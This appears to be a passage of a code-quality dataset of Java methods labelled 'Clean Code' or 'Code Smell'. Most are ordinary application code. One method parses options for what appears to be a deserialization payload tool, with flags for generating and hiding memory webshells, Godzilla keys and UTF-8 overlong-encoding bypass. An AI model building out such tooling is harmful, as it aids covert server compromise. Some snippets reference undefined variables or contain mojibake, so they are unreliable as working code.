    this.voteCtx.init(this.conf.getConf(),this.conf.isStable() ? null : this.conf.getOldConf());
    oldTerm=this.currTerm;
  }
  finally {
    this.writeLock.unlock();
  }
  final LogId lastLogId=this.logManager.getLastLogId(true);
  this.writeLock.lock();
  try {
    if (oldTerm != this.currTerm) {
      LOG.warn(""Node {} raise term {} when getLastLogId."",getNodeId(),this.currTerm);
      return;
    }
    for (    final PeerId peer : this.conf.listPeers()) {
      if (peer.equals(this.serverId)) {
        continue;
      }
      if (!this.rpcService.connect(peer.getEndpoint())) {
        LOG.warn(""Node {} channel init failed, address={}."",getNodeId(),peer.getEndpoint());
        continue;
      }
      final OnRequestVoteRpcDone done=new OnRequestVoteRpcDone(peer,this.currTerm,this);
      done.request=RequestVoteRequest.newBuilder().setPreVote(false).setGroupId(this.groupId).setServerId(this.serverId.toString()).setPeerId(peer.toString()).setTerm(this.currTerm).setLastLogIndex(lastLogId.getIndex()).setLastLogTerm(lastLogId.getTerm()).build();
      this.rpcService.requestVote(peer.getEndpoint(),done.request,done);
    }
    this.metaStorage.setTermAndVotedFor(this.currTerm,this.serverId);
    this.voteCtx.grant(this.serverId);
    if (this.voteCtx.isGranted()) {
      becomeLeader();
    }
  }
  finally {
    this.writeLock.unlock();
  }
}
",0,Clean Code
"protected CorsConfigurationSource corsConfigurationSource(){
  UrlBasedCorsConfigurationSource source=new UrlBasedCorsConfigurationSource();
  ApplicationProperties properties=getCoreConfig().getApplicationProperties();
  List<CrossOriginProperties> corsPropertiess=properties.getCrossOriginPropertiess();
  for (  CrossOriginProperties corsps : corsPropertiess) {
    String[] paths=corsps.getPaths();
    if (paths == null || paths.length == 0)     continue;
    if (paths.length == 1 && SHOW_CHART_DASHBOARD_PATH_PLACEHOLDER.equalsIgnoreCase(paths[0]))     paths=resolveShowChartAndDashboardUrls();
    for (    String path : paths) {
      CorsConfiguration coscfg=new CorsConfiguration();
      if (corsps.getAllowedOrigins() != null && corsps.getAllowedOrigins().length > 0)       coscfg.setAllowedOriginPatterns(Arrays.asList(corsps.getAllowedOrigins()));
 else       if (corsps.getAllowedOriginPatterns() != null && corsps.getAllowedOriginPatterns().length > 0)       coscfg.setAllowedOriginPatterns(Arrays.asList(corsps.getAllowedOriginPatterns()));
      if (corsps.getAllowedMethods() != null && corsps.getAllowedMethods().length > 0)       coscfg.setAllowedMethods(Arrays.asList(corsps.getAllowedMethods()));
      if (corsps.getAllowedHeaders() != null && corsps.getAllowedHeaders().length > 0)       coscfg.setAllowedHeaders(Arrays.asList(corsps.getAllowedHeaders()));
      if (corsps.getExposedHeaders() != null && corsps.getExposedHeaders().length > 0)       coscfg.setExposedHeaders(Arrays.asList(corsps.getExposedHeaders()));
      coscfg.setAllowCredentials(corsps.isAllowCredentials());
      if (corsps.getMaxAge() != null)       coscfg.setMaxAge(corsps.getMaxAge());
      source.registerCorsConfiguration(path,coscfg);
    }
  }
  return source;
}",0,Clean Code
"@Override public CfQrCodeExample getExampleByQuery(CfQrCodeQuery cfQrCodeQuery){
  CfQrCodeExample cfQrCodeExample=new CfQrCodeExample();
  CfQrCodeExample.Criteria criteria=cfQrCodeExample.createCriteria();
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getCodeType())) {
    criteria.andCodeTypeEqualTo(cfQrCodeQuery.getCodeType());
  }
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getSourceId())) {
    criteria.andSourceIdEqualTo(cfQrCodeQuery.getSourceId());
  }
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getCreaterId())) {
    criteria.andCreaterIdEqualTo(cfQrCodeQuery.getCreaterId());
  }
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getFromUid())) {
    criteria.andFromUidEqualTo(cfQrCodeQuery.getFromUid());
  }
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getToUid())) {
    criteria.andToUidEqualTo(cfQrCodeQuery.getToUid());
  }
  if (cfQrCodeQuery.getMinCreateTime() != null) {
    criteria.andCreateTimeGreaterThanOrEqualTo(cfQrCodeQuery.getMinCreateTime());
  }
  if (cfQrCodeQuery.getMaxCreateTime() != null) {
    criteria.andCreateTimeLessThanOrEqualTo(cfQrCodeQuery.getMaxCreateTime());
  }
  if (cfQrCodeQuery.getMinEffectiveTime() != null) {
    criteria.andEffectiveTimeGreaterThanOrEqualTo(cfQrCodeQuery.getMinEffectiveTime());
  }
  if (cfQrCodeQuery.getMaxEffectiveTime() != null) {
    criteria.andEffectiveTimeLessThanOrEqualTo(cfQrCodeQuery.getMaxEffectiveTime());
  }
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getOrderBy())) {
    cfQrCodeExample.setOrderByClause(cfQrCodeQuery.getOrderBy());
  }
  if (cfQrCodeQuery.getPage() != null && cfQrCodeQuery.getSize() != null) {
    PageHelper.startPage(cfQrCodeQuery.getPage(),cfQrCodeQuery.getSize());
  }
  return cfQrCodeExample;
}
",0,Clean Code
"/** 
 * Consume messages in Pull mode through a single-session factory instance.
 * @param args   Startup parameter array, including the following parts:The 1st parameter masterServers is the master address(es) to connect to, format is master1_ip:port[,master2_ip:port]; The 2nd parameter subTopicAndFiterItems the topic(s) (and filter condition set) to consume on, format is topic_1[[:filterCond_1.1[;filterCond_1.2]][,topic_2]]; The 3rd parameter groupName is the name of consumer group; The 4th parameter consumeCount is the amount of messages that need to be consumed; The 5th  parameter fetchThreadCnt is the count of fetch thread.
 */
public static void main(String[] args) throws Throwable {
  final String masterServers=args[0];
  final String subTopicAndFiterItems=args[1];
  final String groupName=args[2];
  final int consumeCount=Integer.parseInt(args[3]);
  int fetchThreadCnt=3;
  if (args.length > 4) {
    fetchThreadCnt=MixedUtils.mid(Integer.parseInt(args[4]),1,Runtime.getRuntime().availableProcessors());
  }
  final Map<String,TreeSet<String>> topicAndFiltersMap=MixedUtils.parseTopicParam(subTopicAndFiterItems);
  ConsumerConfig consumerConfig=new ConsumerConfig(masterServers,groupName);
  consumerConfig.setConsumePosition(ConsumePosition.CONSUMER_FROM_LATEST_OFFSET);
  sessionFactory=new TubeSingleSessionFactory(consumerConfig);
  pullConsumer=sessionFactory.createPullConsumer(consumerConfig);
  for (  Map.Entry<String,TreeSet<String>> entry : topicAndFiltersMap.entrySet()) {
    pullConsumer.subscribe(entry.getKey(),entry.getValue());
  }
  pullConsumer.completeSubscribe();
  Thread[] fetchRunners=new Thread[fetchThreadCnt];
  for (int i=0; i < fetchRunners.length; i++) {
    fetchRunners[i]=new Thread(new Runnable(){
      @Override public void run(){
        ConsumerResult csmResult;
        int getCount=consumeCount;
        do {
          if (pullConsumer.isPartitionsReady(5000) || pullConsumer.isShutdown()) {
            break;
          }
        }
 while (true);
        do {
          try {
            if (pullConsumer.isShutdown()) {
              logger.warn(""Consumer is shutdown!"");
              break;
            }
            csmResult=pullConsumer.getMessage();
            if (csmResult.isSuccess()) {
              List<Message> messageList=csmResult.getMessageList();
              if (messageList != null && !messageList.isEmpty()) {
                msgRcvStats.addMsgCount(csmResult.getTopicName(),messageList.size());
              }
              pullConsumer.confirmConsume(csmResult.getConfirmContext(),true);
            }
 else {
              if (!IGNORE_ERROR_SET.contains(csmResult.getErrCode())) {
                logger.debug(""Receive messages errorCode is {}, Error message is {}"",csmResult.getErrCode(),csmResult.getErrMsg());
              }
            }
            if (consumeCount > 0) {
              if (--getCount <= 0) {
                logger.info(""Consumer has consumed {} messages!"",consumeCount);
                break;
              }
            }
          }
 catch (          Throwable e) {
          }
        }
 while (true);
        logger.info(""The fetch thread has exited!"");
      }
    }
,""_fetch_runner_"" + i);
  }
  for (  Thread thread : fetchRunners) {
    thread.start();
  }
  Thread statisticThread=new Thread(msgRcvStats,""Receive Statistic Thread"");
  statisticThread.start();
}",1,Code Smell
"private void onSubscribe(int buttonState){
  if (!mIsMetadataLoaded) {
    MessageHelpers.showMessage(getContext(),R.string.wait_data_loading);
    return;
  }
  if (!YouTubeSignInService.instance().isSigned()) {
    MessageHelpers.showMessage(getContext(),R.string.msg_signed_users_only);
    return;
  }
  if (buttonState == PlayerUI.BUTTON_OFF) {
    callMediaItemObservable(mMediaItemService::subscribeObserve);
  }
 else {
    callMediaItemObservable(mMediaItemService::unsubscribeObserve);
  }
  getPlayer().getVideo().isSubscribed=buttonState == PlayerUI.BUTTON_OFF;
  getPlayer().setButtonState(R.id.action_subscribe,buttonState == PlayerUI.BUTTON_OFF ? PlayerUI.BUTTON_ON : PlayerUI.BUTTON_OFF);
}
",0,Clean Code
"public void accept(final AxmlVisitor av) throws IOException {
  Stack<NodeVisitor> nvs=new Stack<NodeVisitor>();
  NodeVisitor tos=av;
  while (true) {
    int type=parser.next();
switch (type) {
case START_TAG:
      nvs.push(tos);
    tos=tos.child(parser.getNamespaceUri(),parser.getName());
  if (tos != null) {
    if (tos != EMPTY_VISITOR) {
      tos.line(parser.getLineNumber());
      for (int i=0; i < parser.getAttrCount(); i++) {
        tos.attr(parser.getAttrNs(i),parser.getAttrName(i),parser.getAttrResId(i),parser.getAttrType(i),parser.getAttrValue(i));
      }
    }
  }
 else {
    tos=EMPTY_VISITOR;
  }
break;
case END_TAG:
tos.end();
tos=nvs.pop();
break;
case START_NS:
av.ns(parser.getNamespacePrefix(),parser.getNamespaceUri(),parser.getLineNumber());
break;
case END_NS:
break;
case TEXT:
tos.text(parser.getLineNumber(),parser.getText());
break;
case END_FILE:
return;
}
}
}",1,Code Smell
"@Override protected void doSolveBackward(DataflowAnalysis<Node,Fact> analysis,DataflowResult<Node,Fact> result){
  CFG<Node> cfg=analysis.getCFG();
  NavigableSet<Node> workList=Sets.newOrderedSet(Comparator.comparingInt(n -> -cfg.getIndex(n)));
  cfg.forEach(node -> {
    if (!cfg.isExit(node)) {
      workList.add(node);
    }
  }
);
  while (!workList.isEmpty()) {
    Node node=workList.pollFirst();
    Fact out;
    int outDegree=cfg.getOutDegreeOf(node);
    if (outDegree > 1) {
      out=result.getOutFact(node);
      cfg.getOutEdgesOf(node).forEach(outEdge -> {
        Fact fact=result.getInFact(outEdge.target());
        if (analysis.needTransferEdge(outEdge)) {
          fact=analysis.transferEdge(outEdge,fact);
        }
        analysis.meetInto(fact,out);
      }
);
    }
 else     if (outDegree == 1) {
      CFGEdge<Node> outEdge=CollectionUtils.getOne(cfg.getOutEdgesOf(node));
      if (analysis.needTransferEdge(outEdge)) {
        out=analysis.transferEdge(outEdge,result.getInFact(outEdge.target()));
        result.setOutFact(node,out);
      }
 else {
        out=result.getOutFact(node);
      }
    }
 else {
      out=result.getOutFact(node);
    }
    Fact in=result.getInFact(node);
    boolean changed=analysis.transferNode(node,in,out);
    if (changed) {
      workList.addAll(cfg.getPredsOf(node));
    }
  }
}",0,Clean Code
"public Drawable getThemeDrawable(Context context,int themeDrawableId){
  Drawable drawable=null;
  if (mLastThemeDrawableState != null && mLastThemeDrawableId == themeDrawableId) {
    Drawable.ConstantState drawableState=mLastThemeDrawableState.get();
    if (DEBUG)     Log.v(TAG,""got cached theme drawable state "" + drawableState);
    if (drawableState != null) {
      drawable=drawableState.newDrawable();
    }
  }
  if (drawable == null) {
    drawable=ContextCompat.getDrawable(context,themeDrawableId);
    if (DEBUG)     Log.v(TAG,""loaded theme drawable "" + drawable);
    mLastThemeDrawableState=new WeakReference<Drawable.ConstantState>(drawable.getConstantState());
    mLastThemeDrawableId=themeDrawableId;
  }
  return drawable;
}
private Drawable getThemeDrawable(){
  Drawable drawable=null;
  if (mThemeDrawableResourceId != -1) {
    drawable=mService.getThemeDrawable(mContext,mThemeDrawableResourceId);
  }
  if (drawable == null) {
    drawable=createEmptyDrawable(mContext);
  }
  return drawable;
}",0,Clean Code
"/** 
 * React to a code input. It may be a code point to insert, or a symbolic value that influences the keyboard behavior. <p> Typically, this is called whenever a key is pressed on the software keyboard. This is not the entry point for gesture input; see the onBatchInput* family of functions for this.
 * @param settingsValues the current settings values.
 * @param event the event to handle.
 * @param keyboardShiftMode the current shift mode of the keyboard, as returned by{@link helium314.keyboard.keyboard.KeyboardSwitcher#getKeyboardShiftMode()}
 * @return the complete transaction object
 */
public InputTransaction onCodeInput(final SettingsValues settingsValues,@NonNull final Event event,final int keyboardShiftMode,final String currentKeyboardScript,final LatinIME.UIHandler handler){
  mWordBeingCorrectedByCursor=null;
  mJustRevertedACommit=false;
  final Event processedEvent;
  if (currentKeyboardScript.equals(ScriptUtils.SCRIPT_HANGUL) && (event.getMCodePoint() >= 0x1100 || Character.isWhitespace(event.getMCodePoint()) || event.getMCodePoint() == -1)) {
    mWordComposer.setHangul(true);
    final Event hangulDecodedEvent=HangulEventDecoder.decodeSoftwareKeyEvent(event);
    processedEvent=mWordComposer.processEvent(hangulDecodedEvent);
  }
 else {
    mWordComposer.setHangul(false);
    processedEvent=mWordComposer.processEvent(event);
  }
  final InputTransaction inputTransaction=new InputTransaction(settingsValues,processedEvent,SystemClock.uptimeMillis(),mSpaceState,getActualCapsMode(settingsValues,keyboardShiftMode));
  if (processedEvent.getMKeyCode() != KeyCode.DELETE || inputTransaction.getMTimestamp() > mLastKeyTime + Constants.LONG_PRESS_MILLISECONDS) {
    mDeleteCount=0;
  }
  mLastKeyTime=inputTransaction.getMTimestamp();
  mConnection.beginBatchEdit();
  if (!mWordComposer.isComposingWord()) {
    mIsAutoCorrectionIndicatorOn=false;
  }
  if (processedEvent.getMCodePoint() != Constants.CODE_SPACE) {
    cancelDoubleSpacePeriodCountdown();
  }
  Event currentEvent=processedEvent;
  while (null != currentEvent) {
    if (currentEvent.isConsumed()) {
      handleConsumedEvent(currentEvent,inputTransaction);
    }
 else     if (currentEvent.isFunctionalKeyEvent()) {
      handleFunctionalEvent(currentEvent,inputTransaction,currentKeyboardScript,handler);
    }
 else {
      handleNonFunctionalEvent(currentEvent,inputTransaction,handler);
    }
    currentEvent=currentEvent.getMNextEvent();
  }
  if (!mConnection.hasSlowInputConnection() && !mWordComposer.isComposingWord() && (settingsValues.isWordCodePoint(processedEvent.getMCodePoint()) || processedEvent.getMKeyCode() == KeyCode.DELETE)) {
    mWordBeingCorrectedByCursor=getWordAtCursor(settingsValues,currentKeyboardScript);
  }
  if (!inputTransaction.didAutoCorrect() && processedEvent.getMKeyCode() != KeyCode.SHIFT && processedEvent.getMKeyCode() != KeyCode.CAPS_LOCK && processedEvent.getMKeyCode() != KeyCode.SYMBOL_ALPHA && processedEvent.getMKeyCode() != KeyCode.ALPHA && processedEvent.getMKeyCode() != KeyCode.SYMBOL)   mLastComposedWord.deactivate();
  if (KeyCode.DELETE != processedEvent.getMKeyCode()) {
    mEnteredText=null;
  }
  mConnection.endBatchEdit();
  return inputTransaction;
}",1,Code Smell
"public static void init(String[] args) throws Exception {
  final Options options=getOptions();
  CommandLineParser parser=new DefaultParser();
  try {
    cmdLine=parser.parse(options,args);
  }
 catch (  Exception e) {
    System.out.println(""[*] Parameter input error, please use -h for more information"");
    System.exit(1);
  }
  if (cmdLine.hasOption(""inherit"")) {
    Config.IS_INHERIT_ABSTRACT_TRANSLET=true;
  }
  if (cmdLine.hasOption(""obscure"")) {
    Config.IS_OBSCURE=true;
  }
  if (cmdLine.hasOption(""cmd-header"")) {
    Config.CMD_HEADER_STRING=cmdLine.getOptionValue(""cmd-header"");
  }
  if (cmdLine.hasOption(""url"")) {
    String url=cmdLine.getOptionValue(""url"");
    if (!url.startsWith(""/"")) {
      url=""/"" + url;
    }
    Config.URL_PATTERN=url;
  }
  if (cmdLine.hasOption(""define-class-from-parameter"")) {
    Config.PARAMETER=cmdLine.getOptionValue(""define-class-from-parameter"");
  }
  if (cmdLine.hasOption(""file"")) {
    Config.WRITE_FILE=true;
    Config.FILE=cmdLine.getOptionValue(""file"");
  }
  if (cmdLine.hasOption(""password"")) {
    Config.PASSWORD_ORI=cmdLine.getOptionValue(""password"");
    Config.PASSWORD=generatePassword(Config.PASSWORD_ORI);
  }
  if (cmdLine.hasOption(""godzilla-key"")) {
    Config.GODZILLA_KEY=generatePassword(cmdLine.getOptionValue(""godzilla-key""));
  }
  if (cmdLine.hasOption(""header-key"")) {
    Config.HEADER_KEY=cmdLine.getOptionValue(""header-key"");
  }
  if (cmdLine.hasOption(""header-value"")) {
    Config.HEADER_VALUE=cmdLine.getOptionValue(""header-value"");
  }
  if (cmdLine.hasOption(""no-com-sun"")) {
    Config.FORCE_USING_ORG_APACHE_TEMPLATESIMPL=true;
  }
  if (cmdLine.hasOption(""mozilla-class-loader"")) {
    Config.USING_MOZILLA_DEFININGCLASSLOADER=true;
  }
  if (cmdLine.hasOption(""rhino"")) {
    Config.USING_RHINO=true;
  }
  if (cmdLine.hasOption(""utf8-Overlong-Encoding"")) {
    Config.IS_UTF_Bypass=true;
  }
  if (cmdLine.hasOption(""gen-mem-shell"")) {
    Config.GEN_MEM_SHELL=true;
    if (cmdLine.hasOption(""gen-mem-shell-name"")) {
      Config.GEN_MEM_SHELL_FILENAME=cmdLine.getOptionValue(""gen-mem-shell-name"");
    }
  }
  if (cmdLine.hasOption(""hide-mem-shell"")) {
    Config.HIDE_MEMORY_SHELL=true;
    if (cmdLine.hasOption(""hide-type"")) {
      Config.HIDE_MEMORY_SHELL_TYPE=Integer.parseInt(cmdLine.getOptionValue(""hide-type""));
    }
  }
}",1,Code Smell
"public static void loadCountries(Utilities.Callback<Pair<Map<String,List<TLRPC.TL_help_country>>,List<String>>> onDone){
  ConnectionsManager connection=ConnectionsManager.getInstance(UserConfig.selectedAccount);
  TLRPC.TL_help_getCountriesList req=new TLRPC.TL_help_getCountriesList();
  req.lang_code=LocaleController.getInstance().getCurrentLocaleInfo() != null ? LocaleController.getInstance().getCurrentLocaleInfo().getLangCode() : Locale.getDefault().getCountry();
  int reqId=connection.sendRequest(req,(response,error) -> {
    if (response != null) {
      TLRPC.TL_help_countriesList help_countriesList=(TLRPC.TL_help_countriesList)response;
      Map<String,List<TLRPC.TL_help_country>> countriesMap=new HashMap<>();
      List<String> sortedLetters=new ArrayList<>();
      for (int i=0; i < help_countriesList.countries.size(); i++) {
        TLRPC.TL_help_country country=help_countriesList.countries.get(i);
        if (country.name != null) {
          country.default_name=country.name;
        }
        if (country.iso2.equalsIgnoreCase(""FT"")) {
          continue;
        }
        String letter=country.default_name.substring(0,1).toUpperCase();
        List<TLRPC.TL_help_country> arr=countriesMap.get(letter);
        if (arr == null) {
          arr=new ArrayList<>();
          countriesMap.put(letter,arr);
          sortedLetters.add(letter);
        }
        arr.add(country);
      }
      Comparator<String> comparator;
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
        Collator collator=Collator.getInstance(LocaleController.getInstance().getCurrentLocale() != null ? LocaleController.getInstance().getCurrentLocale() : Locale.getDefault());
        comparator=collator::compare;
      }
 else {
        comparator=String::compareTo;
      }
      Collections.sort(sortedLetters,comparator);
      for (      List<TLRPC.TL_help_country> arr : countriesMap.values()) {
        Collections.sort(arr,(country,country2) -> comparator.compare(country.default_name,country2.default_name));
      }
      AndroidUtilities.runOnUIThread(() -> onDone.run(new Pair<>(countriesMap,sortedLetters)));
    }
  }
);
}",1,Code Smell
"private void generateObjs(JMethod method,HeapModel heapModel,int k){
  Deque<Pair<Obj,Integer>> queue=new ArrayDeque<>();
  if (!method.isStatic() && !method.getDeclaringClass().isAbstract()) {
    thisObj=heapModel.getMockObj(Descriptor.ENTRY_DESC,new MethodParam(method,THIS_INDEX),method.getDeclaringClass().getType(),method);
    queue.add(new Pair<>(thisObj,0));
  }
  paramObjs=new Obj[method.getParamCount()];
  for (int i=0; i < method.getParamCount(); ++i) {
    Type paramType=method.getParamType(i);
    if (isInstantiable(paramType)) {
      paramObjs[i]=heapModel.getMockObj(Descriptor.ENTRY_DESC,new MethodParam(method,i),paramType,method);
      queue.add(new Pair<>(paramObjs[i],0));
    }
  }
  fieldObjs=Maps.newTwoKeyMultiMap();
  arrayObjs=Maps.newMultiMap();
  while (!queue.isEmpty()) {
    Pair<Obj,Integer> pair=queue.pop();
    Obj base=pair.first();
    int level=pair.second();
    if (level < k) {
      Type type=base.getType();
      if (type instanceof ClassType) {
        for (        JField field : cType.getJClass().getDeclaredFields()) {
          Type fieldType=field.getType();
          if (isInstantiable(fieldType)) {
            Obj obj=heapModel.getMockObj(Descriptor.ENTRY_DESC,base.getAllocation() + ""."" + field.getName(),fieldType,method);
            fieldObjs.put(base,field,obj);
            queue.add(new Pair<>(obj,level + 1));
          }
        }
      }
 else       if (type instanceof ArrayType) {
        Type elemType=aType.elementType();
        if (isInstantiable(elemType)) {
          Obj elem=heapModel.getMockObj(Descriptor.ENTRY_DESC,base.getAllocation() + ""[*]"",elemType,method);
          arrayObjs.put(base,elem);
          queue.add(new Pair<>(elem,level + 1));
        }
      }
    }
  }
}",1,Code Smell
"private void performWriteContactsToPhoneBookInternal(ArrayList<TLRPC.TL_contact> contactsArray){
  Cursor cursor=null;
  try {
    Account account=systemAccount;
    if (!hasContactsPermission() || account == null) {
      return;
    }
    final SharedPreferences settings=MessagesController.getMainSettings(currentAccount);
    final boolean forceUpdate=!settings.getBoolean(""contacts_updated_v7"",false);
    if (forceUpdate) {
      settings.edit().putBoolean(""contacts_updated_v7"",true).commit();
    }
    final ContentResolver contentResolver=ApplicationLoader.applicationContext.getContentResolver();
    Uri rawContactUri=ContactsContract.RawContacts.CONTENT_URI.buildUpon().appendQueryParameter(ContactsContract.RawContacts.ACCOUNT_NAME,systemAccount.name).appendQueryParameter(ContactsContract.RawContacts.ACCOUNT_TYPE,systemAccount.type).build();
    cursor=contentResolver.query(rawContactUri,new String[]{BaseColumns._ID,ContactsContract.RawContacts.SYNC2},null,null,null);
    LongSparseArray<Long> bookContacts=new LongSparseArray<>();
    if (cursor != null) {
      while (cursor.moveToNext()) {
        bookContacts.put(cursor.getLong(1),cursor.getLong(0));
      }
      cursor.close();
      cursor=null;
      for (int a=0; a < contactsArray.size(); a++) {
        TLRPC.TL_contact u=contactsArray.get(a);
        if (forceUpdate || bookContacts.indexOfKey(u.user_id) < 0) {
          addContactToPhoneBook(getMessagesController().getUser(u.user_id),forceUpdate);
        }
      }
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
 finally {
    if (cursor != null) {
      cursor.close();
    }
  }
}",1,Code Smell
"public void updateRecordButton(TLRPC.Chat chat,TLRPC.UserFull userFull){
  emojiButtonRestricted=false;
  stickersEnabled=true;
  sendPlainEnabled=true;
  sendRoundEnabled=true;
  sendVoiceEnabled=true;
  if (chat != null) {
    audioVideoButtonContainer.setAlpha(ChatObject.canSendVoice(chat) || (ChatObject.canSendRoundVideo(chat) && hasRecordVideo) ? 1.0f : 0.5f);
    stickersEnabled=ChatObject.canSendStickers(chat);
    sendPlainEnabled=ChatObject.canSendPlain(chat);
    emojiButtonRestricted=!stickersEnabled && !sendPlainEnabled;
    emojiButtonAlpha=emojiButtonRestricted ? 0.5f : 1.0f;
    updateEmojiButtonParams();
    if (!emojiButtonRestricted) {
      if (emojiView != null) {
        emojiView.setStickersBanned(!sendPlainEnabled,!stickersEnabled,-dialog_id);
      }
    }
    sendRoundEnabled=ChatObject.canSendRoundVideo(chat);
    sendVoiceEnabled=ChatObject.canSendVoice(chat);
  }
 else   if (userFull != null) {
    userInfo=userFull;
    audioVideoButtonContainer.setAlpha(userFull.voice_messages_forbidden ? 0.5f : 1.0f);
  }
  updateFieldHint(false);
  boolean currentModeVideo=isInVideoMode;
  if (!sendRoundEnabled && currentModeVideo) {
    currentModeVideo=false;
  }
  if (!sendVoiceEnabled && !currentModeVideo) {
    if (hasRecordVideo) {
      currentModeVideo=true;
    }
 else {
      currentModeVideo=false;
    }
  }
  setRecordVideoButtonVisible(currentModeVideo,false);
}",0,Clean Code
"/** 
 * 投影值分组
 * @param result
 * @param minPixelNum 最小像素累计值
 * @param minSpace    最小间隔数
 * @return
 */
public static List<int[]> groupResult(int[] result,int minPixelNum,int minSpace){
  List<int[]> bwY=new ArrayList<>();
  if (result.length > 0) {
    int targetStart=-1;
    int cal=0;
    for (int i=0; i < result.length; i++) {
      if (targetStart == -1 && result[i] > minPixelNum) {
        targetStart=i;
      }
 else       if (targetStart != -1) {
        if (result[i] <= minPixelNum) {
          if (cal > minSpace) {
            bwY.add(new int[]{targetStart,i - cal});
            targetStart=-1;
            cal=0;
          }
 else {
            cal++;
          }
        }
 else {
          cal=0;
        }
      }
    }
    if (targetStart != -1 && cal <= minSpace) {
      bwY.add(new int[]{targetStart,result.length - 1});
    }
  }
  return bwY;
}",1,Code Smell
"private static void collectAnimalCard(){
  try {
    JSONObject jo=new JSONObject(AntForestRpcCall.antdodoHomePage());
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      JSONObject data=jo.getJSONObject(""data"");
      JSONObject animalBook=data.getJSONObject(""animalBook"");
      String bookId=animalBook.getString(""bookId"");
      String endDate=animalBook.getString(""endDate"") + "" 23:59:59"";
      antdodoReceiveTaskAward();
      if (!antdodoIn8Days(endDate) || antdodoLastDay(endDate))       antdodoPropList();
      JSONArray ja=data.getJSONArray(""limit"");
      int index=-1;
      for (int i=0; i < ja.length(); i++) {
        jo=ja.getJSONObject(i);
        if (""DAILY_COLLECT"".equals(jo.getString(""actionCode""))) {
          index=i;
          break;
        }
      }
      if (index >= 0) {
        int leftFreeQuota=jo.getInt(""leftFreeQuota"");
        for (int j=0; j < leftFreeQuota; j++) {
          jo=new JSONObject(AntForestRpcCall.antdodoCollect());
          if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
            data=jo.getJSONObject(""data"");
            JSONObject animal=data.getJSONObject(""animal"");
            String ecosystem=animal.getString(""ecosystem"");
            String name=animal.getString(""name"");
            Log.forest(""绁炲鐗╃馃["" + ecosystem + ""]#""+ name);
            if (!Config.sendFriendCard().isEmpty() && !FriendIdMap.getCurrentUid().equals(Config.sendFriendCard().get(0))) {
              int fantasticStarQuantity=animal.optInt(""fantasticStarQuantity"",0);
              if (fantasticStarQuantity == 3) {
                sendCard(animal,Config.sendFriendCard().get(0));
              }
            }
          }
 else {
            Log.i(TAG,jo.getString(""resultDesc""));
          }
        }
      }
      if (!Config.sendFriendCard().isEmpty() && !FriendIdMap.getCurrentUid().equals(Config.sendFriendCard().get(0))) {
        sendAntdodoCard(bookId,Config.sendFriendCard().get(0));
      }
    }
 else {
      Log.i(TAG,jo.getString(""resultDesc""));
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""collect err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"@SuppressWarnings(""unchecked"") private void listRendererChanged(){
  Object sel=listRendererComboBox.getSelectedItem();
  if (!(sel instanceof String))   return;
switch ((String)sel) {
case ""default"":
    for (    JList<String> list : allLists)     list.setCellRenderer(new DefaultListCellRenderer());
  break;
case ""defaultSubclass"":
for (JList<String> list : allLists) list.setCellRenderer(new TestDefaultListCellRenderer());
break;
case ""label"":
for (JList<String> list : allLists) list.setCellRenderer(new TestLabelListCellRenderer());
break;
case ""labelRounded"":
for (JList<String> list : allLists) list.setCellRenderer(new TestLabelRoundedListCellRenderer());
break;
}
String style=sel.equals(""labelRounded"") ? ""selectionArc: 6; selectionInsets: 0,1,0,1"" : null;
for (JList<String> list : allLists) list.putClientProperty(FlatClientProperties.STYLE,style);
}",0,Clean Code
"@Override public boolean check(){
  boolean hasWarning=false;
  try {
    SymbolTable symbolTable=GlobalState.currentProgram.getSymbolTable();
    if (symbolTable == null) {
      Logging.debug(""Empty symbols table"");
      return false;
    }
    Function entryFunction=null;
    if (GlobalState.config.getEntryAddress() != null) {
      entryFunction=GlobalState.flatAPI.getFunctionAt(GlobalState.flatAPI.toAddr(GlobalState.config.getEntryAddress()));
    }
 else {
      List<Function> mainFunctions=GlobalState.flatAPI.getGlobalFunctions(""main"");
      if (mainFunctions.isEmpty()) {
        return false;
      }
      entryFunction=mainFunctions.get(0);
    }
    CallGraph callGraph=CallGraph.getCallGraph(entryFunction);
    ArrayList<Symbol> accessSymbols=new ArrayList<>();
    ArrayList<Symbol> openSymbols=new ArrayList<>();
    for (    Symbol symbol : symbolTable.getAllSymbols(true)) {
      if (accessName.contains(symbol.getName()) && symbol.hasReferences() && !isSymbolThunk(symbol)) {
        Logging.debug(""Has \"""" + symbol.getName() + ""()\"" symbol at ""+ symbol.getAddress());
        accessSymbols.add(symbol);
      }
      if (openName.equals(symbol.getName()) && symbol.hasReferences() && !isSymbolThunk(symbol)) {
        Logging.debug(""Has \"""" + openName + ""()\"" symbol at ""+ symbol.getAddress());
        openSymbols.add(symbol);
      }
    }
    for (    Symbol symbol : accessSymbols) {
      for (      Reference ref : symbol.getReferences()) {
        Address fromAddress=ref.getFromAddress();
        Logging.debug(fromAddress + ""->"" + ref.getToAddress());
        Function caller=GlobalState.flatAPI.getFunctionContaining(fromAddress);
        if (caller == null) {
          continue;
        }
        Logging.debug(""\"""" + symbol.getName() + ""()\"" called at ""+ fromAddress.toString()+ "" from \""""+ caller.getName()+ ""()\"" function"");
        Logging.debug(""Checking path from \"""" + caller.getName() + ""()\"" to \""""+ openName+ ""()\"""");
        ArrayList<Address> addresses=hasPathToSymbols(callGraph,caller,openSymbols);
        for (        Address address : addresses) {
          CWEReport report=getNewReport(""Possible TOCTOU combination \"""" + symbol.getName() + ""()\"" and \""""+ openName+ ""()\"""").setAddress(address);
          Logging.report(report);
          hasWarning=true;
        }
      }
    }
  }
 catch (  Exception exception) {
    exception.printStackTrace();
  }
  return hasWarning;
}",1,Code Smell
"/** 
 * Check notify consistency and replace.
 * @param executorProperties
 */
private void checkNotifyConsistencyAndReplace(ExecutorProperties executorProperties){
  boolean checkNotifyConfig=false;
  boolean checkNotifyAlarm=false;
  Map<String,List<NotifyConfigDTO>> newDynamicThreadPoolNotifyMap=configModeNotifyConfigBuilder.buildSingleNotifyConfig(executorProperties);
